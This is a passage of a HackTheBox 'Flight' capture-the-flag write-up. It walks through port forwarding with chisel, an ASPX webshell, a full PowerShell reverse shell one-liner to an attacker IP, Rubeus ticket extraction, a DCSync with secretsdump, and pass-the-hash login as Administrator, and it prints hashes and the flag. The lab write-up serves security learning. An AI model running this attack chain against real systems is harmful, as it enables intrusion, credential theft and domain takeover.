manually?</p>"},{"location":"ch3ckm8_HTB_Flight/#correlating-listening-ports-with-the-iis-server","title":"Correlating listening ports with the IIS server","text":"<p>The command below queries the HTTP Server (HTTP.sys) kernel driver and shows the current state of all HTTP-related services and their request queues.</p> <pre><code>netsh http show servicestate\n</code></pre> <pre><code>Snapshot of HTTP service state (Server Session View): \n----------------------------------------------------- \n\nServer session ID: FF00000120000001\n    Version: 1.0\n    State: Active\n    Properties:\n        Max bandwidth: 4294967295\n        Timeouts:\n            Entity body timeout (secs): 120\n            Drain entity body timeout (secs): 120\n            Request queue timeout (secs): 120\n            Idle connection timeout (secs): 120\n            Header wait timeout (secs): 120\n            Minimum send rate (bytes/sec): 150\n    URL groups:\n    URL group ID: FE00000140000001\n        State: Active\n        Request queue name: Request queue is unnamed.\n        Properties:\n            Max bandwidth: inherited\n            Max connections: inherited\n            Timeouts:\n                Timeout values inherited\n            Number of registered URLs: 2\n            Registered URLs:\n                HTTP://+:5985/WSMAN/\n                HTTP://+:47001/WSMAN/\n\nServer session ID: FD00000120000001\n    Version: 2.0\n    State: Active\n    Properties:\n        Max bandwidth: 4294967295\n        Timeouts:\n            Entity body timeout (secs): 120\n            Drain entity body timeout (secs): 120\n            Request queue timeout (secs): 65535\n            Idle connection timeout (secs): 120\n            Header wait timeout (secs): 120\n            Minimum send rate (bytes/sec): 240\n    URL groups:\n    URL group ID: FF00000040000001\n        State: Active\n        Request queue name: DefaultAppPool\n        Properties:\n            Max bandwidth: inherited\n            Max connections: 4294967295\n            Timeouts:\n                Entity body timeout (secs): 120\n                Drain entity body timeout (secs): 120\n                Request queue timeout (secs): 65535\n                Idle connection timeout (secs): 120\n                Header wait timeout (secs): 0\n                Minimum send rate (bytes/sec): 0\n            Logging information:\n                Log directory: C:\\inetpub\\logs\\LogFiles\\W3SVC1\n                Log format: 0\n            Authentication Configuration:\n                Authentication schemes enabled:\n            Number of registered URLs: 1\n            Registered URLs:\n                HTTP://127.0.0.1:8000:127.0.0.1/\n\nRequest queues:\n    Request queue name: Request queue is unnamed.\n        Version: 1.0\n        State: Active\n        Request queue 503 verbosity level: Basic\n        Max requests: 1000\n        Number of active processes attached: 1\n        Process IDs:\n            3416\n\n    Request queue name: DefaultAppPool\n        Version: 2.0\n        State: Active\n        Request queue 503 verbosity level: Limited\n        Max requests: 1000\n        Number of active processes attached: 0\n        Controller process ID: 3408\n        Process IDs:\n</code></pre> <p>In the above output, the presence of the IIS server is verified according to these 2 indicators</p> <p><code>Request queue name: DefaultAppPool</code> </p> <p><code>Log directory: C:\\inetpub\\logs\\LogFiles\\W3SVC1</code></p> <pre><code>URL group ID: FF00000040000001\n        State: Active\n        Request queue name: DefaultAppPool\n        Properties:\n            Max bandwidth: inherited\n            Max connections: 4294967295\n            Timeouts:\n                Entity body timeout (secs): 120\n                Drain entity body timeout (secs): 120\n                Request queue timeout (secs): 65535\n                Idle connection timeout (secs): 120\n                Header wait timeout (secs): 0\n                Minimum send rate (bytes/sec): 0\n            Logging information:\n                Log directory: C:\\inetpub\\logs\\LogFiles\\W3SVC1\n                Log format: 0\n            Authentication Configuration:\n                Authentication schemes enabled:\n            Number of registered URLs: 1\n            Registered URLs:\n                HTTP://127.0.0.1:8000:127.0.0.1/\n</code></pre> <p>So as seen above, the associated port is <code>8000</code></p> <p>I then automated the process for future reference, using my custom powershell script to identify IIS presence with associated port:</p> <pre><code>.\\listenports.ps1\n\n[+] Collecting IIS servicestate...\n[+] IIS-registered ports found:\n\nPort    URL                              AppPool       \n----    ---                              -------       \nunknown HTTP://127.0.0.1:8000:127.0.0.1/ DefaultAppPool\n</code></pre> <pre><code>Write-Host \"`n[+] Collecting IIS servicestate...\"\n$servicestate = netsh http show servicestate\n\n$results = @()\n$currentQueue = $null\n\nforeach ($line in $servicestate) {\n    if ($line -match \"Request queue name:\\s+(.*)\") {\n        $currentQueue = $Matches[1]\n    }\n    elseif ($line -match \"^\\s*HTTP\") {\n        # Skip unnamed queues (non-IIS)\n        if ($currentQueue -eq \"Request queue is unnamed.\") { continue }\n\n        $url = $line.Trim()\n        # Extract port number from URL (after last :)\n        if ($url -match \":(\\d+)/\") {\n            $port = $Matches[1]\n        } else {\n            $port = \"unknown\"\n        }\n        $results += [PSCustomObject]@{\n            Port    = $port\n            URL     = $url\n            AppPool = $currentQueue\n        }\n    }\n}\n\nif ($results) {\n    Write-Host \"[+] IIS-registered ports found:`n\"\n    $results | Sort-Object Port | Format-Table -AutoSize\n} else {\n    Write-Host \"[!] No IIS ports found in servicestate.\"\n}\n</code></pre>"},{"location":"ch3ckm8_HTB_Flight/#port-forwarding","title":"Port forwarding","text":"<p>Since we have found earlier that port <code>8000</code> was bound to an IIS server, lets port forward towards our attacker machine to get access to it</p>"},{"location":"ch3ckm8_HTB_Flight/#using-chisel","title":"Using chisel","text":"<ul> <li>Download chisel</li> </ul> <pre><code>wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_windows_amd64.gz\n</code></pre> <ul> <li>then run local server for transferring</li> </ul> <pre><code>python -m http.server 800\n</code></pre> <ul> <li>on target host retrieve the executable</li> </ul> <pre><code>powershell -c wget 10.10.14.180:800/chisel.exe -outfile chisel.exe\n</code></pre> <ul> <li>on attacker machine:</li> </ul> <pre><code>chisel server -p 8000 --reverse\n</code></pre> <ul> <li>inside the target host:</li> </ul> <pre><code>.\\chisel.exe client 10.10.14.180:8000 R:8001:127.0.0.1:8000\n</code></pre> <p>The screenshot below shows that the port forwarding was successful:</p> <p></p> <p>Next visit <code>http://127.0.0.1:8001</code> , and there is the webpage:</p> <p></p>"},{"location":"ch3ckm8_HTB_Flight/#banner-grabbing_2","title":"Banner grabbing","text":"<pre><code>whatweb 127.0.0.1:8001\n</code></pre> <pre><code>http://127.0.0.1:8001 [200 OK] Bootstrap, Country[RESERVED][ZZ], Frame, Google-API[ajax/libs/jquery/1.10.2/jquery.min.js], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[127.0.0.1], JQuery[1.10.2,1.11.2], Microsoft-IIS[10.0], Modernizr[2.8.3-respond-1.4.2.min], Script[text/javascript], Title[Flight - Travel and Tour], X-Powered-By[ASP.NET], X-UA-Compatible[IE=edge], YouTube\n</code></pre> <p>As indicated earlier on from our investigation, its an <code>IIS server</code> (Microsoft-IIS[10.0]) , but how can we move forward????</p>"},{"location":"ch3ckm8_HTB_Flight/#understanding-the-iis-server","title":"Understanding the IIS server","text":"<p>With little research i found that the Default IIS Web Site root folder is:</p> <pre><code>C:\\inetpub\\wwwroot\n</code></pre> <p>so lets hop in the shell we had earlier as C.Bum and navigate towards the above dir</p> <pre><code>Directory of C:\\inetpub\n\n08/23/2025  04:00 PM    &lt;DIR&gt;          .\n08/23/2025  04:00 PM    &lt;DIR&gt;          ..\n09/22/2022  12:24 PM    &lt;DIR&gt;          custerr\n08/23/2025  04:01 PM    &lt;DIR&gt;          development\n09/22/2022  01:08 PM    &lt;DIR&gt;          history\n09/22/2022  12:32 PM    &lt;DIR&gt;          logs\n09/22/2022  12:24 PM    &lt;DIR&gt;          temp\n09/22/2022  12:28 PM    &lt;DIR&gt;          wwwroot\n               0 File(s)              0 bytes\n               8 Dir(s)   4,088,504,320 bytes free\n</code></pre>"},{"location":"ch3ckm8_HTB_Flight/#webpage-content-directory","title":"Webpage content directory","text":"<p>Lets find where the content is located:</p> <p><code>wwwroot</code> Directory</p> <pre><code>Directory of C:\\inetpub\\wwwroot\n\n09/22/2022  12:28 PM    &lt;DIR&gt;          .\n09/22/2022  12:28 PM    &lt;DIR&gt;          ..\n09/22/2022  12:28 PM    &lt;DIR&gt;          aspnet_client\n09/22/2022  12:24 PM               703 iisstart.htm\n09/22/2022  12:24 PM            99,710 iisstart.png\n               2 File(s)        100,413 bytes\n               3 Dir(s)   4,088,504,320 bytes free\n</code></pre> <p>this dir does not contain the contents</p> <p><code>development</code> Directory </p> <pre><code>Directory of C:\\inetpub\\development\n\n08/23/2025  04:12 PM    &lt;DIR&gt;          .\n08/23/2025  04:12 PM    &lt;DIR&gt;          ..\n04/16/2018  02:23 PM             9,371 contact.html\n08/23/2025  04:11 PM    &lt;DIR&gt;          css\n08/23/2025  04:12 PM    &lt;DIR&gt;          fonts\n08/23/2025  04:12 PM    &lt;DIR&gt;          img\n04/16/2018  02:23 PM            45,949 index.html\n08/23/2025  04:12 PM    &lt;DIR&gt;          js\n               2 File(s)         55,320 bytes\n               6 Dir(s)   4,020,420,608 bytes free\n</code></pre> <p>This does contain the webpage content, so whatever we upload on this directory will be accessible from the browser.</p> <p>But what user has permissions to upload there??</p> <p>Lets get back to the shell we had as <code>svc_apache</code>, since its an IIS server we wanna see which user has write permissions on the <code>development</code> directory, and it seems that user C.Bum has write permissions! (indicated by the W in parenthesis on the 2nd line below)</p> <p></p> <p>Next, what if we follow the same approach like we did for getting shell as svc_apache? </p> <p>Since we have write permissions on the development directory, lets try uploading the php shell we used for svc_apache:</p>"},{"location":"ch3ckm8_HTB_Flight/#uploading-webshell-on-the-iis-server","title":"Uploading webshell on the IIS server","text":"<p>retrieve the file inside the target:</p> <pre><code>powershell -c wget 10.10.14.180:800/rev5.php -outfile rev5.php\n</code></pre> <p>hm tried to upload it but its not found when navigating to it:</p> <p></p> <p>Why didnt this work? Well i later discovered that PHP is not native to IIS and By default, IIS is set up to run ASP.NET applications.</p> <p>Well since php wont work, lets try other languange, and specifically the one thats native to IIS, so <code>aspx</code> shell, i used this:</p> <p>https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx</p> <p>retrieve the file inside the target:</p> <pre><code>powershell -c wget 10.10.14.180:800/cmd.aspx -outfile cmd.aspx\n</code></pre> <p>this works! By default these values are filled, lets input the command we want:</p> <p></p> <p>I will use this command:</p> <pre><code>powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.10.14.180',9005);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\n</code></pre> <p>but first, we need to find the path, lets get on C.Bum shell and check where is the powershell located:</p> <pre><code>C:\\inetpub\\development&gt;where powershell\nwhere powershell\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n</code></pre> <p>okay inside the fields of the webshell we paste the following:</p> <ul> <li>Program</li> </ul> <pre><code>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n</code></pre> <ul> <li>Arguments: (the rest of the command)</li> </ul> <pre><code>-nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.10.14.180',9005);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\n</code></pre> <p>\u2192 got shell</p> <p></p> <p>Great! we got shell, but as what user?? the user is <code>iis apppool</code> , what is this user? well obviously its related to the IIS server but lets find more.</p>"},{"location":"ch3ckm8_HTB_Flight/#shell-as-iis-apppool","title":"Shell as IIS APPPOOL","text":""},{"location":"ch3ckm8_HTB_Flight/#what-is-user-iis-apppooldefaultapppool","title":"What is user iis apppool\\defaultapppool ?","text":"<p>According to Microsoft, <code>IIS AppPool\\&lt;AppPoolName&gt;</code> is a service account created by IIS to run an application pool.</p> <ul> <li>Internally, it can authenticate to other services using the machine account (<code>DOMAIN\\MACHINENAME$</code>) when the app pool accesses network resources \u2014 basically, it acts as the computer account on the network.</li> <li>This is why we can grab a Kerberos ticket (TGS) for the machine account if we have code execution (in our case we do have) as the app pool identity, because the app pool is able to request tickets using its machine account delegation/impersonation rights.</li> </ul> <p>Furthermore, for future reference i created these bullet points:</p>"},{"location":"ch3ckm8_HTB_Flight/#attack-vectors-via-apppool-identity","title":"Attack Vectors via AppPool Identity","text":"<ol> <li>Local File System<ul> <li>Check <code>wwwroot</code> and temp folders for writable paths.</li> <li>Upload web shells or malicious DLLs if writable.</li> <li>Look for sensitive configuration files (web.config with credentials).</li> </ul> </li> <li>Local Privilege Escalation<ul> <li>Misconfigured permissions (folders, registry, services) could allow escalation to SYSTEM.</li> <li>Exploit <code>SeImpersonatePrivilege</code> if available for token impersonation (e.g., Rubeus, JuicyPotato, RottenPotato).</li> </ul> </li> <li>Network / Machine Account<ul> <li>AppPool can authenticate as the machine account (<code>DOMAIN\\MACHINENAME$</code>) on the network.</li> <li>With code execution, you can:<ul> <li>Request Kerberos TGS for the machine account (<code>Rubeus</code> \u2192 ticket harvesting / overpass-the-hash attacks).</li> <li>Access network shares or services that trust the machine account.</li> <li>Pivot laterally to other machines.</li> </ul> </li> </ul> </li> <li>Other Web Apps / Services<ul> <li>If multiple apps share the same pool, compromise may affect all of them.</li> <li>Look for sensitive app logic or credentials exposed internally.</li> </ul> </li> <li>Persistence<ul> <li>Upload scheduled tasks, backdoor DLLs, or modify IIS configuration if permissions allow.</li> </ul> </li> </ol>"},{"location":"ch3ckm8_HTB_Flight/#check-users-privileges","title":"Check user\u2019s privileges","text":"<pre><code>whoami /all\n</code></pre> <pre><code>PRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                               State   \n============================= ========================================= ========\nSeAssignPrimaryTokenPrivilege Replace a process level token             Disabled\nSeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled\nSeMachineAccountPrivilege     Add workstations to domain                Disabled\nSeAuditPrivilege              Generate security audits                  Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking                  Enabled \nSeImpersonatePrivilege        Impersonate a client after authentication Enabled \nSeCreateGlobalPrivilege       Create global objects                     Enabled \nSeIncreaseWorkingSetPrivilege Increase a process working set            Disabled\n</code></pre> <p>The most interesting one to me here after researching it is the <code>SeImpersonatePrivilege</code> . By the name of it, it indicates impersonating other users/accounts.</p>"},{"location":"ch3ckm8_HTB_Flight/#what-is-the-privilege-seimpersonate","title":"What is the privilege SeImpersonate ?","text":"<ul> <li>In Windows, SeImpersonatePrivilege is a user right that allows a process to impersonate the security context of another user on the same system.</li> <li>A process with this privilege can take another user\u2019s token (session) and execute actions as if it were that user.</li> <li>This is commonly used for services that need to act on behalf of a logged-in user, but in pentesting it can be abused for privilege escalation or ticket requests.</li> </ul>"},{"location":"ch3ckm8_HTB_Flight/#so-in-our-case","title":"So in our case:","text":"<ul> <li>DefaultAppPool is a service account running on the host.</li> <li>On Windows, many services running as SYSTEM or AppPool accounts have SeImpersonatePrivilege by default.</li> <li>This means a process running as DefaultAppPool can impersonate other accounts on the machine, including the machine account itself (<code>MACHINE$</code>).</li> </ul>"},{"location":"ch3ckm8_HTB_Flight/#what-impersonating-the-machine-account-locally-means","title":"What impersonating the MACHINE$ account locally means","text":"<ol> <li>DefaultAppPool runs Rubeus.</li> <li>Rubeus uses SeImpersonatePrivilege to grab the token of the MACHINE$ account on the local host. (the token contains also creds for the user)</li> <li>While impersonating MACHINE$, Rubeus can request Kerberos tickets from the DC as if it were MACHINE$.</li> <li>The KDC trusts the request and issues a legitimate Silver Ticket for a service on the host.</li> </ol>"},{"location":"ch3ckm8_HTB_Flight/#why-this-works-without-the-machine-account-password","title":"Why this works without the machine account password","text":"<ul> <li>Normally, to forge a Silver Ticket, you need the NTLM hash of MACHINE$.</li> <li>Here, because DefaultAppPool can impersonate MACHINE$, the ticket is issued legitimately by the DC, so no password or hash is required.</li> <li>This is a local privilege escalation combined with Kerberos ticket request, a common attack path in Active Directory pentesting.</li> </ul>"},{"location":"ch3ckm8_HTB_Flight/#why-not-impersonate-administrator-directly","title":"Why not impersonate Administrator directly?","text":"<p>Even though DefaultAppPool has some privileges, it cannot directly impersonate the Administrator account unless certain conditions are met. Let me break it down carefully:</p>"},{"location":"ch3ckm8_HTB_Flight/#1-seimpersonateprivilege-vs-actual-tokens","title":"1\ufe0f\u20e3 SeImpersonatePrivilege vs. actual tokens","text":"<ul> <li>SeImpersonatePrivilege allows a process to impersonate tokens that already exist on the machine.</li> <li>The key is: the token must be active/logged-on or present in memory.</li> <li>DefaultAppPool usually runs under a service account and can see some local system or machine account tokens, but it cannot arbitrarily create or access Administrator tokens unless an Administrator is currently logged in or has a process running that the AppPool can grab.</li> </ul>"},{"location":"ch3ckm8_HTB_Flight/#2-why-machine-works","title":"2\ufe0f\u20e3 Why MACHINE$ works","text":"<ul> <li>MACHINE$ always has a token available locally, because the machine account is the identity of the host in the domain.</li> <li>Windows automatically creates and maintains the MACHINE$ token for local operations and Kerberos authentication.</li> <li>DefaultAppPool can impersonate MACHINE$ because that token exists and the AppPool has SeImpersonatePrivilege.</li> </ul>"},{"location":"ch3ckm8_HTB_Flight/#3-why-administrator-is-harder","title":"3\ufe0f\u20e3 Why Administrator is harder","text":"<ul> <li>Administrator tokens exist only when someone is logged in or when a process runs as Administrator.</li> <li>On most servers, Administrator is not actively logged in, and DefaultAppPool cannot spawn one.</li> <li>Without an Administrator token to grab, SeImpersonatePrivilege cannot be used to impersonate it directly.</li> </ul>"},{"location":"ch3ckm8_HTB_Flight/#4-practical-implications","title":"4\ufe0f\u20e3 Practical implications","text":"<ul> <li>By impersonating MACHINE$, you can legitimately request a Silver Ticket from the KDC.</li> <li>That ticket inherits high privileges on the host, including access to LSASS, which allows you to dump Administrator hashes anyway.</li> <li>This is why you don\u2019t need to impersonate Administrator directly \u2014 MACHINE$ is enough to escalate or extract secrets.</li> </ul> <p>\ud83d\udca1 Summary:</p> <p>DefaultAppPool cannot directly impersonate Administrator because the Administrator token isn\u2019t readily available. MACHINE$ works because its token always exists locally, and impersonating it allows you to act with very high privileges anyway. </p>"},{"location":"ch3ckm8_HTB_Flight/#grabbing-machine-accounts-ticket-with-rubeus","title":"Grabbing machine account\u2019s ticket with Rubeus","text":"<p>Start locally a python server, then retrieve the file on the target host:</p> <pre><code>powershell -c wget 10.10.14.180:800/Rubeus.exe -outfile Rubeus.exe\n</code></pre> <p>run rubeus</p> <pre><code>.\\Rubeus.exe tgtdeleg /nowrap\n</code></pre> <pre><code>   ______        _                      \n  (_____ \\      | |                     \n   _____) )_   _| |__  _____ _   _  ___ \n  |  __  /| | | |  _ \\| ___ | | | |/___)\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n  |_|   |_|____/|____/|_____)____/(___/\n\n  v2.2.0 \n\n[*] Action: Request Fake Delegation TGT (current user)\n\n[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'\n[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/g0.flight.htb'\n[+] Kerberos GSS-API initialization success!\n[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.\n[*] Found the AP-REQ delegation ticket in the GSS-API output.\n[*] Authenticator etype: aes256_cts_hmac_sha1\n[*] Extracted the service ticket session key from the ticket cache: eAztthc+aOmkBoZUMiSKVWE2CqzSYvcKM/APadCdlZg=\n[+] Successfully decrypted the authenticator\n[*] base64(ticket.kirbi):\n\n      doIFVDCCBVCgAwIBBaEDAgEWooIEZDCCBGBhggRcMIIEWKADAgEFoQwbCkZMSUdIVC5IVEKiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkZMSUdIVC5IVEKjggQgMIIEHKADAgESoQMCAQKiggQOBIIECq5ljBkW9O5BYWEDIS2OmwVeoGZbkfugbE8pBTvgbXsfYf/riYBd75znb0xTK1eweKz2CFVFe24AXZUjz6hYNsEHjSM6OxHdI04wIYfZvgcPVdL5xfgmZ11og6ULW9wLA9JiL1S4E5pWIl/CoEjc2TMFlO66KW+4JYqGv148W2KFWcvd+m/GJlwCPmohcX8m+KAWTwmI8Gw2rYZ3gAc7AXVWw6GC1h2ssGIlmg9z/5jP0XX4smSU9HIr7rhtcZDxOJ+y3+Yu8vl5HQHvZi6wV8K7RLi/s8rYXXkWJ4Pc5s1QAYIGKUAp6m4jQUQ1vQbRm7bASYY7R+W5WUqerJxmbtkF3xnTwW/s48gqeFKyRb6DDAnYX66TAXhN70xdPcTGAgaLrwK4FGXPR5xKRjIU20Lgp+Tl/oa8BCEccR+DzIKCAiSQSef13Y/wuTJQ1dC5BBiSXMShVE+2RVst6wp168IoIoWBx6OD8yKANzJOAFX9W1Ieuky3xK3fywFK4GTxSvSLPGFB8U8JHe6IhZmlWJeFWmryF0AiqVc7CkmjY63WG3R/uZz9JDE5KZ88cecfu2ODlOHHNM9WwD8UZc6YpYkxGKQOuEH89SqVbxACo3VfsgmasLqSsD6CaO/gxsK3umwbjlKTfCmfZ4ld78HtpNFKjhMI224lfqIJKK3Iv2pmCGfGOgEjxDN1hD6NAxUe7nhomiDmA0VBKdS8lsrM+kT7nbMUzvMaMNDuMdtjh+1K0f6vkJ+lApJsuHIZ/nW/e3MRTMbsfNx7PqVJilIsA39684m+RwltsZCZDWFn+6tsSXI9D5D3hcSh8EXqRRKJhD5Ia+1mC7v8ZIgFnJEIys5CNs59mapk7kXjY4nFJ2f0ofYZuk1YrV8x30Wb/6p+PnA0a1UV4UcRcAxUpXBptJCUkgMs07E5ybN7aAJ5FwR1lqvQpP7f2AhRgEHBnTrX7jMCtz2OMC1KYcPiGxudBL3JQZqo0FRAT7HGwlvwe+Q7M36sRIIOZX1HujXkUURlXZMO/yivEuD/5c3+f2X4zCQSy9My8sDWrZdK7TNt3QkXWDfOy+2/IXXpFRfcpccz7EH7dTMPIuZ1AzYRX07LjK4MJ/PTl4AnD37tN7iu6mF4Z4V0QBRNCK1cZ7e8I+/whgh+Ral83HHAB8h8W/sVGB4K9cW0Kl/3l2cRO7uJq/FUVSudRJr3jfp0srmDK9ujno0nRVueON/4R0/CQRQgTGP7U9Y6zVMgRT2FM24CtMuqiBBiL0YOQcQAOvD+/VOhbr3xChRQzQScp2Jte6/gWoqzfmsQlxvPe6yzMMlR6tGNIK4bOKPKc/e9PVLemQGZgIYBRX2+N/Nte+c4TZvp2uB+gqIyYohWoVvIo4HbMIHYoAMCAQCigdAEgc19gcowgceggcQwgcEwgb6gKzApoAMCARKhIgQgZ+NhRRlTt9s9gM7xQtaF9eHGA5iwrVQK+UeMbarvoimhDBsKRkxJR0hULkhUQqIQMA6gAwIBAaEHMAUbA0cwJKMHAwUAYKEAAKURGA8yMDI1MDgyNDAwMjUxN1qmERgPMjAyNTA4MjQxMDI1MTdapxEYDzIwMjUwODMxMDAyNTE3WqgMGwpGTElHSFQuSFRCqR8wHaADAgECoRYwFBsGa3JidGd0GwpGTElHSFQuSFRC\n</code></pre> <p>We obtained Silver Ticket for the <code>machine account</code>. </p> <p>What Rubeus did here?</p> <ul> <li>Action: <code>Request Fake Delegation TGT (current user)</code><ul> <li>This means Rubeus is creating a delegation ticket for the current account.</li> <li>A \u201cfake delegation TGT\u201d is essentially a TGS-for-a-service with delegation rights, not a full TGT for the domain.</li> </ul> </li> <li>Target SPN: <code>cifs/g0.flight.htb</code><ul> <li>It automatically tried to get a ticket for the CIFS service on the host <code>g0.flight.htb</code>.</li> </ul> </li> <li>Result: <code>AP-REQ delegation ticket is now in GSS-API output</code><ul> <li>An AP-REQ is a Kerberos request that uses a service ticket (TGS) to authenticate to a service.</li> <li>The ticket you now have is a service ticket for CIFS (i.e., a Silver Ticket in practice).</li> </ul> </li> <li><code>Found the AP-REQ delegation ticket in the GSS-API output.</code><ul> <li>This confirms you now have a delegation-capable TGS for the target service.</li> <li>It\u2019s not a TGT; it\u2019s limited to the service you requested.</li> </ul> </li> </ul> <p>This is essentially a Silver Ticket. It allows you to authenticate to the target host\u2019s service (CIFS) using the machine account\u2019s privileges </p> <p>Silver Ticket recap</p> <ul> <li>A Silver Ticket is a Kerberos service ticket (TGS) for a specific service on a host, forged or obtained using the service account\u2019s secret (here: machine account).</li> <li>Scope is limited to that service/host.</li> <li>You can use it to authenticate to the host/service without going to the Domain Controller again.</li> </ul> <p>So our ticket:</p> <ul> <li>Is a service ticket for <code>cifs/g0.flight.htb</code>, signed with the machine account\u2019s key.</li> <li>Works like a Silver Ticket, because it\u2019s host/service-specific.</li> </ul> <p>Here is a graphical representation of what Rubeus did:</p> <p></p> <p>mermaid:</p> <pre><code>sequenceDiagram\n    participant AppPool as DefaultAppPool (compromised)\n    participant Rubeus\n    participant Machine as MACHINE$ (Machine Account)\n    participant Target as Host Service (CIFS/g0.flight.htb)\n\n    Note over AppPool: Rubeus is run under DefaultAppPool account\n\n    %% AppPool uses MACHINE$ key to request a service ticket\n    AppPool-&gt;&gt;Rubeus: Run Rubeus to request TGS for CIFS/g0.flight.htb\n    Rubeus-&gt;&gt;Machine: Uses MACHINE$ key to build TGS request\n    Machine--&gt;&gt;Rubeus: Provides AP-REQ delegation ticket (Silver Ticket)\n    Rubeus-&gt;&gt;AppPool: Returns Silver Ticket for use\n\n    %% Target receives the service ticket\n    AppPool-&gt;&gt;Target: Presents Silver Ticket to authenticate as MACHINE$\n    Target--&gt;&gt;AppPool: Grants access according to MACHINE$ privileges\n</code></pre> <p>What does access to this account mean? what can we do with this type of account?</p>"},{"location":"ch3ckm8_HTB_Flight/#what-are-machine-accounts-accounts","title":"What are Machine accounts (<code>$</code> accounts)","text":"<ul> <li>Every computer joined to an Active Directory domain has a machine account, e.g., <code>MACHINE$</code>.</li> <li>Machine accounts are essentially treated as highly privileged on their own host:<ul> <li>They can authenticate as the computer itself.</li> <li>They usually have local admin rights on their own machine.</li> <li>They are trusted by the domain for certain actions, including DCSync-like operations if the host is allowed.</li> </ul> </li> </ul> <p>We will procced to converting it from Base64 to Kirbi format</p> <pre><code>cat flight_ticket.b64 | base64 -d &gt; ticket.kirbi\npython kirbi2ccache.py ticket.kirbi ticket.ccache\n</code></pre> <pre><code>INFO:root:Parsing kirbi file /home/ch3ckm8/my_data/flight_ticket.kirbi\nINFO:root:Done!\n</code></pre> <p>it worked, next lets sync with the domain:</p> <pre><code>sudo ntpdate -u flight.htb\n</code></pre> <p>Then tell Kerberos to use the file <code>ticket.ccache</code> to store and read our authentication tickets instead of the default cache:</p> <pre><code>export KRB5CCNAME=ticket.ccache\n</code></pre> <p>Also modify etc/hosts like this to include the domain (g0) too: (secretsdump failed without it xd, i should have added it on the recon phase)</p> <pre><code>10.129.146.179 school.flight.htb flight.htb g0.flight.htb\n</code></pre>"},{"location":"ch3ckm8_HTB_Flight/#dcsync","title":"DCSync","text":"<p>next, i used secretsdump to perform the <code>DCSync</code></p> <pre><code>secretsdump.py -k -no-pass g0.flight.htb\n</code></pre> <ul> <li><code>k</code> tells it to use Kerberos authentication instead of NTLM.</li> <li><code>no-pass</code> means you don\u2019t provide a password.</li> <li>So effectively, it uses the Kerberos ticket to authenticate to the target.</li> </ul> <pre><code>Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies \n\n[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:6a2b6ce4d7121e112aeacbc6bd499a7f:::\nS.Moon:1602:aad3b435b51404eeaad3b435b51404ee:f36b6972be65bc4eaa6983b5e9f1728f:::\n</code></pre> <p>Why did this work?</p> <ul> <li>used the machine account\u2019s ticket (TGT/TGS) \u2014 not a regular user.</li> <li>The machine account was able to authenticate to the target over SMB/RPC.</li> <li>Because the target host (DC) trusts machine accounts, it allowed access to LSASS, and secretsdump could retrieve NTLM hashes of other users, including <code>Administrator</code>.</li> </ul> <p>Key points:</p> <ul> <li>Machine account tickets can be more powerful than regular user tickets, because the account is essentially a trusted domain principal.</li> <li>Not every machine account can dump secrets everywhere \u2014 depends on domain policies and target host.</li> <li>The fact that you dumped the Administrator NTLM confirms that:<ol> <li>The ticket was valid for the target service (TGS for CIFS/host).</li> <li>The machine account had sufficient privilege to read LSASS.</li> </ol> </li> </ul> <p>so we got administrators NTLM hash! lets login via winrm</p>"},{"location":"ch3ckm8_HTB_Flight/#logging-in-as-administrator-via-pass-the-hash","title":"Logging in as Administrator via pass the hash","text":"<pre><code>evil-winrm -i flight.htb -u administrator -H '43bbfc530bab76141b12c8446e30c17c'\n</code></pre> <p>grabbed root flag: <code>be6ba64f9dd6f54a69284c332c492694</code></p> <p>proof:</p> <p></p>"},{"location":"ch3ckm8_HTB_Flight/#summary","title":"Summary","text":"<p>Here is the list of the steps simplified, per phase, for future reference and for quick reading: </p>"},{"location":"ch3ckm8_HTB_Flight/#reconnaissance_1","title":"Reconnaissance","text":"<ol> <li>nmap <code>scan</code> -&gt; chose <code>SMB</code> <code>RPC</code> <code>LDAP</code> and <code>HTTP</code> to focus on first</li> <li>Enumerated <code>SMB</code> -&gt; nothing valuable found</li> <li>Enumerated <code>RPC</code> -&gt; nothing valuable found</li> <li>Enumerated <code>LDAP</code> -&gt; nothing valuable found</li> <li>Enumerated <code>HTTP</code>, first directories, then subdomains, and then virtual hosts -&gt; found vhosts</li> <li>Inspected the webapp, and gathered information</li> <li>According to the 